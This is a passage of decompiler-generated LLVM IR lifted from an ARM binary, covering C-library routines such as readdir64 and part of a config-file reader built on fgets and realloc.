  %v2_15a6c = load i32, i32* %v1_15a6c, align 4
  store i32 %v2_15a6c, i32* %ip.global-to-local, align 4
  %v3_15a6c = add i32 %v0_15a64, 28
  %v4_15a6c = inttoptr i32 %v3_15a6c to i32*
  %v5_15a6c = load i32, i32* %v4_15a6c, align 4
  store i32 %v5_15a6c, i32* %lr.global-to-local, align 4
  %v1_15a70 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a70 = add i32 %v1_15a70, 44
  %v3_15a70 = inttoptr i32 %v2_15a70 to i32*
  store i32 %v3_15a64, i32* %v3_15a70, align 4
  %v0_15a74 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a74 = add i32 %v0_15a74, 64
  %v2_15a74 = inttoptr i32 %v1_15a74 to i32*
  %v3_15a74 = load i32, i32* %v2_15a74, align 4
  %v1_15a78 = add i32 %v0_15a74, 56
  %v2_15a78 = inttoptr i32 %v1_15a78 to i32*
  %v3_15a78 = load i32, i32* %v2_15a78, align 4
  store i32 %v3_15a78, i32* %r2.global-to-local, align 4
  %v1_15a7c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a7c = add i32 %v1_15a7c, 52
  %v3_15a7c = inttoptr i32 %v2_15a7c to i32*
  store i32 %v3_15a74, i32* %v3_15a7c, align 4
  %v0_15a80 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a80 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a80 = add i32 %v1_15a80, 48
  %v3_15a80 = inttoptr i32 %v2_15a80 to i32*
  store i32 %v0_15a80, i32* %v3_15a80, align 4
  %v0_15a84 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a84 = add i32 %v0_15a84, 72
  %v1_15a88 = inttoptr i32 %v1_15a84 to i32*
  %v2_15a88 = load i32, i32* %v1_15a88, align 4
  %v3_15a88 = add i32 %v0_15a84, 76
  %v4_15a88 = inttoptr i32 %v3_15a88 to i32*
  %v5_15a88 = load i32, i32* %v4_15a88, align 4
  store i32 %v5_15a88, i32* %r1.global-to-local, align 4
  %v0_15a8c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a8c = add i32 %v0_15a8c, 56
  %v1_15a90 = inttoptr i32 %v1_15a8c to i32*
  store i32 %v2_15a88, i32* %v1_15a90, align 4
  %v3_15a90 = add i32 %v0_15a8c, 60
  %v4_15a90 = inttoptr i32 %v3_15a90 to i32*
  %v5_15a90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a90, i32* %v4_15a90, align 4
  %v0_15a94 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a94 = add i32 %v0_15a94, 80
  %v1_15a98 = inttoptr i32 %v1_15a94 to i32*
  %v2_15a98 = load i32, i32* %v1_15a98, align 4
  %v3_15a98 = add i32 %v0_15a94, 84
  %v4_15a98 = inttoptr i32 %v3_15a98 to i32*
  %v5_15a98 = load i32, i32* %v4_15a98, align 4
  store i32 %v5_15a98, i32* %r1.global-to-local, align 4
  %v0_15a9c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a9c = add i32 %v0_15a9c, 64
  %v1_15aa0 = inttoptr i32 %v1_15a9c to i32*
  store i32 %v2_15a98, i32* %v1_15aa0, align 4
  %v3_15aa0 = add i32 %v0_15a9c, 68
  %v4_15aa0 = inttoptr i32 %v3_15aa0 to i32*
  %v5_15aa0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15aa0, i32* %v4_15aa0, align 4
  %v0_15aa4 = load i32, i32* %r5.global-to-local, align 4
  %v1_15aa4 = add i32 %v0_15aa4, 16
  %v2_15aa4 = inttoptr i32 %v1_15aa4 to i32*
  %v3_15aa4 = load i32, i32* %v2_15aa4, align 4
  %v1_15aa8 = load i32, i32* %r6.global-to-local, align 4
  %v2_15aa8 = add i32 %v1_15aa8, 16
  %v3_15aa8 = inttoptr i32 %v2_15aa8 to i32*
  store i32 %v3_15aa4, i32* %v3_15aa8, align 4
  %v0_15aac = load i32, i32* %r5.global-to-local, align 4
  %v1_15aac = add i32 %v0_15aac, 88
  %v1_15ab0 = add i32 %v0_15aac, 20
  %v2_15ab0 = inttoptr i32 %v1_15ab0 to i32*
  %v3_15ab0 = load i32, i32* %v2_15ab0, align 4
  store i32 %v3_15ab0, i32* %r2.global-to-local, align 4
  %v1_15ab4 = inttoptr i32 %v1_15aac to i32*
  %v2_15ab4 = load i32, i32* %v1_15ab4, align 4
  %v3_15ab4 = add i32 %v0_15aac, 92
  %v4_15ab4 = inttoptr i32 %v3_15ab4 to i32*
  %v5_15ab4 = load i32, i32* %v4_15ab4, align 4
  store i32 %v5_15ab4, i32* %r1.global-to-local, align 4
  %v0_15ab8 = load i32, i32* %r6.global-to-local, align 4
  %v1_15ab8 = add i32 %v0_15ab8, 72
  %v1_15abc = inttoptr i32 %v1_15ab8 to i32*
  store i32 %v2_15ab4, i32* %v1_15abc, align 4
  %v3_15abc = add i32 %v0_15ab8, 76
  %v4_15abc = inttoptr i32 %v3_15abc to i32*
  %v5_15abc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15abc, i32* %v4_15abc, align 4
  %v0_15ac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ac0 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ac0 = add i32 %v1_15ac0, 20
  %v3_15ac0 = inttoptr i32 %v2_15ac0 to i32*
  store i32 %v0_15ac0, i32* %v3_15ac0, align 4
  %v0_15ac4 = load i32, i32* %ip.global-to-local, align 4
  %v1_15ac4 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ac4 = add i32 %v1_15ac4, 24
  %v3_15ac4 = inttoptr i32 %v2_15ac4 to i32*
  store i32 %v0_15ac4, i32* %v3_15ac4, align 4
  %v0_15ac8 = load i32, i32* %lr.global-to-local, align 4
  %v1_15ac8 = load i32, i32* %r6.global-to-local, align 4
  %v2_15ac8 = add i32 %v1_15ac8, 28
  %v3_15ac8 = inttoptr i32 %v2_15ac8 to i32*
  store i32 %v0_15ac8, i32* %v3_15ac8, align 4
  %v2_15acc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15acc, i32* %r4.global-to-local, align 4
  ret i32 %v2_15ab4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r6, align 4
  %v1_15ae8 = add i32 %tmp, 24
  store i32 %v1_15ae8, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15b00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  store i32 %v4_15b00, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15b00)
  %v0_15b14 = load i32, i32* @r6, align 4
  %v2_15b14 = add i32 %v0_15b14, 16
  %v3_15b14 = inttoptr i32 %v2_15b14 to i32*
  %v4_15b14 = load i32, i32* %v3_15b14, align 4
  store i32 %v4_15b14, i32* %ip.global-to-local, align 4
  store i32 88864, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15b14)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15b54, %entry
  %v0_15b24 = load i32, i32* @r5, align 4
  %v1_15b24 = add i32 %v0_15b24, 4
  %v2_15b24 = inttoptr i32 %v1_15b24 to i32*
  %v3_15b24 = load i32, i32* %v2_15b24, align 4
  %v4_15b24 = add i32 %v0_15b24, 8
  %v5_15b24 = inttoptr i32 %v4_15b24 to i32*
  %v6_15b24 = load i32, i32* %v5_15b24, align 4
  %tmp10 = icmp ugt i32 %v6_15b24, %v3_15b24
  br i1 %tmp10, label %dec_label_pc_15b54, label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b24
  %v1_15b30 = inttoptr i32 %v0_15b24 to i32*
  %v2_15b30 = load i32, i32* %v1_15b30, align 4
  %v1_15b34 = add i32 %v0_15b24, 12
  %v2_15b34 = inttoptr i32 %v1_15b34 to i32*
  %v3_15b34 = load i32, i32* %v2_15b34, align 4
  %v1_15b38 = add i32 %v0_15b24, 20
  %v2_15b38 = inttoptr i32 %v1_15b38 to i32*
  %v3_15b38 = load i32, i32* %v2_15b38, align 4
  %v4_15b3c = inttoptr i32 %v3_15b34 to i32*
  %v5_15b3c = call i32 @__getdents64(i32 %v2_15b30, i32* %v4_15b3c, i32 %v3_15b38, i32 %v6_15b24)
  %tmp9 = icmp slt i32 %v5_15b3c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_15b4c

.thread:                                          ; preds = %dec_label_pc_15b30
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15b84

dec_label_pc_15b4c:                               ; preds = %dec_label_pc_15b30
  %v1_15b4c = load i32, i32* @r5, align 4
  %v2_15b4c = add i32 %v1_15b4c, 8
  %v3_15b4c = inttoptr i32 %v2_15b4c to i32*
  store i32 %v5_15b3c, i32* %v3_15b4c, align 4
  %v0_15b50 = load i32, i32* @r7, align 4
  %v1_15b50 = load i32, i32* @r5, align 4
  %v2_15b50 = add i32 %v1_15b50, 4
  %v3_15b50 = inttoptr i32 %v2_15b50 to i32*
  store i32 %v0_15b50, i32* %v3_15b50, align 4
  %v0_15b54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b24, %dec_label_pc_15b4c
  %v1_15b78 = phi i32 [ %v0_15b24, %dec_label_pc_15b24 ], [ %v0_15b54.pre, %dec_label_pc_15b4c ]
  %v1_15b54 = add i32 %v1_15b78, 4
  %v2_15b54 = inttoptr i32 %v1_15b54 to i32*
  %v3_15b54 = load i32, i32* %v2_15b54, align 4
  %v1_15b58 = add i32 %v1_15b78, 12
  %v2_15b58 = inttoptr i32 %v1_15b58 to i32*
  %v3_15b58 = load i32, i32* %v2_15b58, align 4
  %v2_15b5c = add i32 %v3_15b58, %v3_15b54
  store i32 %v2_15b5c, i32* @r4, align 4
  %v3_15b60 = inttoptr i32 %v2_15b5c to i32*
  %v4_15b60 = load i32, i32* %v3_15b60, align 4
  %v1_15b64 = add i32 %v2_15b5c, 4
  %v2_15b64 = inttoptr i32 %v1_15b64 to i32*
  %v3_15b64 = load i32, i32* %v2_15b64, align 4
  %v1_15b68 = add i32 %v2_15b5c, 16
  %v2_15b68 = inttoptr i32 %v1_15b68 to i16*
  %v3_15b68 = load i16, i16* %v2_15b68, align 2
  %v4_15b68 = zext i16 %v3_15b68 to i32
  %v1_15b6c = add i32 %v2_15b5c, 8
  %v2_15b6c = inttoptr i32 %v1_15b6c to i32*
  %v3_15b6c = load i32, i32* %v2_15b6c, align 4
  store i32 %v3_15b6c, i32* %ip.global-to-local, align 4
  %v2_15b70 = add i32 %v4_15b68, %v3_15b54
  %v2_15b74 = or i32 %v3_15b64, %v4_15b60
  %v4_15b74 = icmp eq i32 %v2_15b74, 0
  store i32 %v2_15b70, i32* %v2_15b54, align 4
  %v0_15b7c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b7c = load i32, i32* @r5, align 4
  %v2_15b7c = add i32 %v1_15b7c, 16
  %v3_15b7c = inttoptr i32 %v2_15b7c to i32*
  store i32 %v0_15b7c, i32* %v3_15b7c, align 4
  br i1 %v4_15b74, label %dec_label_pc_15b24, label %dec_label_pc_15b84

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b54, %.thread
  %v0_15b90 = load i32, i32* @r6, align 4
  %v2_15b90 = add i32 %v0_15b90, 44
  %v3_15b90 = inttoptr i32 %v2_15b90 to i32*
  %v4_15b90 = load i32, i32* %v3_15b90, align 4
  store i32 %v4_15b90, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15b90)
  %v0_15b9c = load i32, i32* @r4, align 4
  ret i32 %v0_15b9c

; uselistorder directives
  uselistorder i32 %v2_15b5c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15b78, { 1, 0 }
  uselistorder i32 %v6_15b24, { 1, 0 }
  uselistorder i32 %v0_15b24, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15b54, { 1, 0 }
}

define i32 @function_15bb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_15bb0:
  %v0_15bb0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15bb0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15bb0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15bb0, %bb
  %v4_15bbc = phi i32 [ %arg1, %dec_label_pc_15bb0 ], [ 0, %bb ]
  ret i32 %v4_15bbc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15bc0 = load i32, i32* @r4, align 4
  %v6_15bc0 = load i32, i32* @r5, align 4
  %v9_15bc0 = load i32, i32* @r6, align 4
  %v12_15bc0 = load i32, i32* @r7, align 4
  %v15_15bc0 = load i32, i32* @r8, align 4
  %v18_15bc0 = load i32, i32* @sb, align 4
  %v21_15bc0 = load i32, i32* @sl, align 4
  %v24_15bc0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15bc4 = icmp eq i32* %arg1, null
  store i1 %v2_15bc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15bc4, label %dec_label_pc_15ed4, label %dec_label_pc_15bdc

dec_label_pc_15bdc:                               ; preds = %entry
  %v1_15bdc = urem i32 %arg3, 256
  store i32 %v1_15bdc, i32* @sb, align 4
  %v1_15be0 = udiv i32 %arg3, 256
  %v3_15be4 = urem i32 %v1_15be0, 256
  %v3_15be8 = mul nuw nsw i32 %v1_15bdc, 4
  %v1_15bf0 = or i32 %v3_15be8, 1
  %v1_15bfc = and i32 %arg3, 131072
  %v1_15c00 = add nsw i32 %v1_15bdc, -1
  %v1_15c0c = and i32 %arg3, 262144
  store i32 %v1_15c0c, i32* %r2.global-to-local, align 4
  %v1_15c10 = and i32 %arg3, 65536
  store i32 %v1_15c10, i32* %r3.global-to-local, align 4
  store i32 %v1_15c10, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15c20 = add i32 %arg4, 1
  store i32 %v1_15c20, i32* @sl, align 4
  %v2_15d98 = icmp eq i32 %v1_15bfc, 0
  %v1_15df0 = inttoptr i32 %arg2 to i32*
  %v2_15e08 = icmp eq i32 %v1_15c0c, 0
  br label %dec_label_pc_15c24

dec_label_pc_15c24:                               ; preds = %dec_label_pc_15c24.backedge, %dec_label_pc_15bdc
  %v2_15c40 = phi i32 [ %v0_15c24.pre, %dec_label_pc_15c24.backedge ], [ %tmp, %dec_label_pc_15bdc ]
  %v1_15c24 = add i32 %v2_15c40, 4
  %v2_15c24 = inttoptr i32 %v1_15c24 to i32*
  %v3_15c24 = load i32, i32* %v2_15c24, align 4
  store i32 %v3_15c24, i32* %r3.global-to-local, align 4
  %v2_15c28 = icmp eq i32 %v3_15c24, 0
  store i1 %v2_15c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c28, label %dec_label_pc_15c30, label %dec_label_pc_15c78

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c24
  %v1_15c30 = add i32 %v2_15c40, 16
  %v2_15c30 = inttoptr i32 %v1_15c30 to i32*
  %v3_15c30 = load i32, i32* %v2_15c30, align 4
  store i32 %v3_15c30, i32* %r3.global-to-local, align 4
  %v2_15c34 = icmp eq i32 %v3_15c30, 0
  store i1 %v2_15c34, i1* %cpsr_z.global-to-local, align 1
  %v1_15c38 = add i32 %v2_15c40, 8
  %v2_15c38 = inttoptr i32 %v1_15c38 to i32*
  %v3_15c38 = load i32, i32* %v2_15c38, align 4
  store i32 %v3_15c38, i32* %r3.global-to-local, align 4
  br i1 %v2_15c34, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15c30
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15c30, align 4
  %v0_15c44.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15c30, %bb
  %v0_15c44 = phi i32 [ %v0_15c44.pre, %bb ], [ %v3_15c38, %dec_label_pc_15c30 ]
  %v2_15c44 = icmp eq i32 %v0_15c44, 0
  store i1 %v2_15c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c44, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15bf0, i32* %r3.global-to-local, align 4
  %v2_15c4c = load i32, i32* @r5, align 4
  %v3_15c4c = add i32 %v2_15c4c, 8
  %v4_15c4c = inttoptr i32 %v3_15c4c to i32*
  store i32 %v1_15bf0, i32* %v4_15c4c, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15c50 = load i32, i32* @r5, align 4
  %v1_15c50 = add i32 %v0_15c50, 16
  %v2_15c50 = inttoptr i32 %v1_15c50 to i32*
  %v3_15c50 = load i32, i32* %v2_15c50, align 4
  store i32 %v3_15c50, i32* %r0.global-to-local, align 4
  %v1_15c54 = add i32 %v0_15c50, 8
  %v2_15c54 = inttoptr i32 %v1_15c54 to i32*
  %v3_15c54 = load i32, i32* %v2_15c54, align 4
  store i32 %v3_15c54, i32* %r3.global-to-local, align 4
  %v2_15c58 = add i32 %v3_15c54, %v3_15c50
  store i32 %v2_15c58, i32* @r0, align 4
  %v0_15c5c = call i32 @malloc()
  store i32 %v0_15c5c, i32* %r0.global-to-local, align 4
  %v2_15c60 = icmp eq i32 %v0_15c5c, 0
  store i1 %v2_15c60, i1* %cpsr_z.global-to-local, align 1
  %v1_15c64 = load i32, i32* @r5, align 4
  %v2_15c64 = add i32 %v1_15c64, 4
  %v3_15c64 = inttoptr i32 %v2_15c64 to i32*
  store i32 %v0_15c5c, i32* %v3_15c64, align 4
  br i1 %v2_15c60, label %dec_label_pc_15ed4, label %dec_label_pc_15c6c

dec_label_pc_15c6c:                               ; preds = %.thread
  %v0_15c6c = load i32, i32* @r5, align 4
  %v1_15c6c = add i32 %v0_15c6c, 20
  %v2_15c6c = inttoptr i32 %v1_15c6c to i32*
  %v3_15c6c = load i32, i32* %v2_15c6c, align 4
  %v1_15c70 = or i32 %v3_15c6c, 1
  store i32 %v1_15c70, i32* %r3.global-to-local, align 4
  store i32 %v1_15c70, i32* %v2_15c6c, align 4
  %v0_15c78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15c78:                               ; preds = %dec_label_pc_15c24, %dec_label_pc_15c6c
  %v1_15c80 = phi i32 [ %v2_15c40, %dec_label_pc_15c24 ], [ %v0_15c78.pre, %dec_label_pc_15c6c ]
  %v1_15c78 = add i32 %v1_15c80, 4
  %v2_15c78 = inttoptr i32 %v1_15c78 to i32*
  %v3_15c78 = load i32, i32* %v2_15c78, align 4
  store i32 %v3_15c78, i32* %r2.global-to-local, align 4
  %v4_15c78 = add i32 %v1_15c80, 8
  %v5_15c78 = inttoptr i32 %v4_15c78 to i32*
  %v6_15c78 = load i32, i32* %v5_15c78, align 4
  %v2_15c7c = add i32 %v6_15c78, %v3_15c78
  store i32 %v2_15c7c, i32* %r3.global-to-local, align 4
  %v2_15c80 = add i32 %v1_15c80, 12
  %v3_15c80 = inttoptr i32 %v2_15c80 to i32*
  store i32 %v2_15c7c, i32* %v3_15c80, align 4
  %v0_15c84 = load i32, i32* @fp, align 4
  store i32 %v0_15c84, i32* @r6, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %dec_label_pc_15d14, %dec_label_pc_15d00, %dec_label_pc_15c78
  %v0_15c90 = phi i32 [ %v0_15c84, %dec_label_pc_15c78 ], [ %v1_15d00, %dec_label_pc_15d00 ], [ %v0_15c90.pre.pre, %dec_label_pc_15d14 ]
  %v0_15c88 = load i32, i32* @r5, align 4
  %v1_15c88 = add i32 %v0_15c88, 12
  store i32 %v1_15c88, i32* %r0.global-to-local, align 4
  %v1_15c8c = inttoptr i32 %v1_15c88 to i32*
  %v2_15c8c = load i32, i32* %v1_15c8c, align 4
  store i32 %v2_15c8c, i32* %r0.global-to-local, align 4
  %v3_15c8c = add i32 %v0_15c88, 16
  %v4_15c8c = inttoptr i32 %v3_15c8c to i32*
  %v5_15c8c = load i32, i32* %v4_15c8c, align 4
  %v2_15c90 = add i32 %v2_15c8c, %v0_15c90
  store i32 %v2_15c90, i32* %r0.global-to-local, align 4
  %v2_15c94 = sub i32 %v5_15c8c, %v0_15c90
  %v1_15c98 = inttoptr i32 %v0_15c88 to i32*
  %v2_15c98 = load i32, i32* %v1_15c98, align 4
  store i32 %v2_15c98, i32* %r2.global-to-local, align 4
  %v3_15c9c = call i32 @fgets(i32 %v2_15c90, i32 %v2_15c94, i32 %v2_15c98)
  store i32 %v3_15c9c, i32* %r0.global-to-local, align 4
  store i32 %v3_15c9c, i32* %r4.global-to-local, align 4
  %v2_15ca0 = icmp eq i32 %v3_15c9c, 0
  store i1 %v2_15ca0, i1* %cpsr_z.global-to-local, align 1
  %v0_15ca8 = load i32, i32* @r5, align 4
  %v1_15ca8 = add i32 %v0_15ca8, 12
  br i1 %v2_15ca0, label %dec_label_pc_15ca8, label %dec_label_pc_15cc0

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c88
  store i32 %v1_15ca8, i32* %r0.global-to-local, align 4
  %v1_15cac = inttoptr i32 %v1_15ca8 to i32*
  %v2_15cac = load i32, i32* %v1_15cac, align 4
  store i32 %v2_15cac, i32* %r0.global-to-local, align 4
  %v3_15cac = add i32 %v0_15ca8, 16
  %v4_15cac = inttoptr i32 %v3_15cac to i32*
  %v5_15cac = load i32, i32* %v4_15cac, align 4
  store i32 %v5_15cac, i32* %r2.global-to-local, align 4
  %v3_15cb4 = inttoptr i32 %v2_15cac to i8*
  %v4_15cb4 = call i32 @__GI_memset(i8* %v3_15cb4, i32 0, i32 %v5_15cac)
  store i32 %v4_15cb4, i32* %r0.global-to-local, align 4
  %v0_15cb8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ed8

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15c88
  %v2_15cc0 = inttoptr i32 %v1_15ca8 to i32*
  %v3_15cc0 = load i32, i32* %v2_15cc0, align 4
  store i32 %v3_15cc0, i32* @r4, align 4
  %v1_15cc4 = load i32, i32* @r6, align 4
  %v2_15cc4 = add i32 %v1_15cc4, %v3_15cc0
  %v3_15cc4 = inttoptr i32 %v2_15cc4 to i8*
  store i32 %v2_15cc4, i32* %r0.global-to-local, align 4
  %v3_15cc8 = call i32 @strlen(i8* %v3_15cc4)
  %v0_15cd0 = load i32, i32* @r6, align 4
  %v2_15cd0 = add i32 %v0_15cd0, %v3_15cc8
  store i32 %v2_15cd0, i32* @r6, align 4
  %v0_15cd4 = load i32, i32* @r4, align 4
  store i32 %v0_15cd4, i32* @r0, align 4
  %v2_15cd8 = call i32 @__GI_strchr(i32 %v0_15cd4, i32 10)
  store i32 %v2_15cd8, i32* %r0.global-to-local, align 4
  %v2_15cdc = icmp eq i32 %v2_15cd8, 0
  store i1 %v2_15cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cdc, label %dec_label_pc_15d08, label %dec_label_pc_15ce4

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cc0
  %v1_15ce4 = inttoptr i32 %v2_15cd8 to i8*
  %v2_15ce4 = load i8, i8* %v1_15ce4, align 1
  %v3_15ce4 = zext i8 %v2_15ce4 to i32
  %v1_15ce8 = add nuw nsw i32 %v3_15ce4, 255
  %v1_15cec = urem i32 %v1_15ce8, 256
  store i32 %v1_15cec, i32* %r3.global-to-local, align 4
  %v7_15cf0 = icmp eq i32 %v1_15cec, 92
  store i1 %v7_15cf0, i1* %cpsr_z.global-to-local, align 1
  %v1_15cf4 = trunc i32 %v1_15ce8 to i8
  store i8 %v1_15cf4, i8* %v1_15ce4, align 1
  %v0_15cf8 = load i32, i32* @r6, align 4
  %v1_15cf8 = add i32 %v0_15cf8, -1
  store i32 %v1_15cf8, i32* @r6, align 4
  %v0_15cfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cfc, label %dec_label_pc_15d00, label %dec_label_pc_15d8c

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15ce4
  %v1_15d00 = add i32 %v0_15cf8, -2
  store i32 %v1_15d00, i32* @r6, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15cc0
  %v0_15d08 = load i32, i32* @r5, align 4
  %v1_15d08 = add i32 %v0_15d08, 20
  %v2_15d08 = inttoptr i32 %v1_15d08 to i32*
  %v3_15d08 = load i32, i32* %v2_15d08, align 4
  store i32 %v3_15d08, i32* %r3.global-to-local, align 4
  %v2_15d0c = icmp eq i32 %v3_15d08, 0
  store i1 %v2_15d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d0c, label %dec_label_pc_15d44, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15d08
  %v1_15d14 = add i32 %v0_15d08, 16
  %v2_15d14 = inttoptr i32 %v1_15d14 to i32*
  %v3_15d14 = load i32, i32* %v2_15d14, align 4
  store i32 %v3_15d14, i32* %r3.global-to-local, align 4
  %v1_15d18 = add i32 %v0_15d08, 8
  %v2_15d18 = inttoptr i32 %v1_15d18 to i32*
  %v3_15d18 = load i32, i32* %v2_15d18, align 4
  %v1_15d1c = add i32 %v3_15d14, 4096
  store i32 %v1_15d1c, i32* %r3.global-to-local, align 4
  %v2_15d20 = add i32 %v3_15d18, %v1_15d1c
  store i32 %v1_15d1c, i32* %v2_15d14, align 4
  %v0_15d28 = load i32, i32* @r5, align 4
  %v1_15d28 = add i32 %v0_15d28, 4
  %v2_15d28 = inttoptr i32 %v1_15d28 to i32*
  %v3_15d28 = load i32, i32* %v2_15d28, align 4
  store i32 %v3_15d28, i32* %r0.global-to-local, align 4
  %v4_15d2c = inttoptr i32 %v3_15d28 to i32*
  %v5_15d2c = call i32 @realloc(i32* %v4_15d2c, i32 %v2_15d20, i32 %v2_15c98, i32 %v1_15d1c)
  store i32 %v5_15d2c, i32* %r0.global-to-local, align 4
  %v0_15d30 = load i32, i32* @r5, align 4
  %v1_15d30 = add i32 %v0_15d30, 8
  %v2_15d30 = inttoptr i32 %v1_15d30 to i32*
  %v3_15d30 = load i32, i32* %v2_15d30, align 4
  %v2_15d34 = add i32 %v3_15d30, %v5_15d2c
  store i32 %v2_15d34, i32* %r3.global-to-local, align 4
  %v2_15d38 = add i32 %v0_15d30, 12
  %v3_15d38 = inttoptr i32 %v2_15d38 to i32*
  store i32 %v2_15d34, i32* %v3_15d38, align 4
  %v1_15d3c = load i32, i32* @r5, align 4
  %v2_15d3c = add i32 %v1_15d3c, 4
  %v3_15d3c = inttoptr i32 %v2_15d3c to i32*
  store i32 %v5_15d2c, i32* %v3_15d3c, align 4
  %v0_15c90.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d08, %.dec_label_pc_15d44_crit_edge
  %v0_15d44 = phi i32 [ %v0_15d44.pre, %.dec_label_pc_15d44_crit_edge ], [ %v0_15d08, %dec_label_pc_15d08 ]
  %v1_15d44 = inttoptr i32 %v0_15d44 to i32*
  %v2_15d44 = load i32, i32* %v1_15d44, align 4
  store i32 %v2_15d44, i32* @r1, align 4
  %v1_15d48 = add i32 %v2_15d44, 52
  %v2_15d48 = inttoptr i32 %v1_15d48 to i32*
  %v3_15d48 = load i32, i32* %v2_15d48, align 4
  store i32 %v3_15d48, i32* %r3.global-to-local, align 4
  %v2_15d4c = icmp eq i32 %v3_15d48, 0
  store i1 %v2_15d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d4c, label %dec_label_pc_15d78, label %dec_label_pc_15d54

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d44
  %v1_15d54 = add i32 %v2_15d44, 16
  %v2_15d54 = inttoptr i32 %v1_15d54 to i32*
  %v3_15d54 = load i32, i32* %v2_15d54, align 4
  store i32 %v3_15d54, i32* %r2.global-to-local, align 4
  %v1_15d58 = add i32 %v2_15d44, 24
  %v2_15d58 = inttoptr i32 %v1_15d58 to i32*
  %v3_15d58 = load i32, i32* %v2_15d58, align 4
  store i32 %v3_15d58, i32* %r3.global-to-local, align 4
  %v3_15d5c = icmp ult i32 %v3_15d54, %v3_15d58
  %v9_15d5c = icmp eq i32 %v3_15d54, %v3_15d58
